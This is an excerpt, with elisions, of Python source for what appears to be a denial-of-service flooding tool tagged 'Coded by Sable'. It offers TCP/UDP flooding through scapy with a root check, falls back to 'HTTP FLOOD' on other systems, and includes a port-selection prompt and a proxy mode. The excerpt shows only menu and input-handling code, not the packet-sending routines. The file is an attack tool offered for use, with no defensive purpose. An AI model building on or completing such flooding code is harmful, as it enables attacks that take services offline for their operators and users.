...
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Coded by Sable

if sys.platform.startswith("linux"): # Coded by Sable
	from scapy.all import * # Coded by Sable
elif sys.platform.startswith("freebsd"): # Coded by Sable
	from scapy.all import * # Coded by Sable
else: # Coded by Sable
	print ("TCP/UDP FLOOD ARE NOT SUPPORTED UNDER THIS SYSTEM. YOU MUST USE HTTP FLOOD.") # Coded by Sable
...
def floodmode():
	...
	if choice1 == "0":
		...
		try:
			if os.getuid() != 0: # Coded by Sable
				print("You need to run this program as root to use TCP/UDP flooding.") # Coded by Sable
				exit(0) # Coded by Sable
			else: # Coded by Sable
				floodport() # Coded by Sable
		except:
			pass
	elif choice1 == "2":
		try:
...
def floodport():
	...
	try:
		...
		portlist = range(65535) # Coded by Sable
		if port in portlist: # Coded by Sable
			pass # Coded by Sable
		else: # Coded by Sable
			print ("You mistyped, try again.")
			floodport() # Coded by Sable
	except ValueError: # Coded by Sable
		print ("You mistyped, try again.") # Coded by Sable
		floodport() # Coded by Sable
	proxymode()
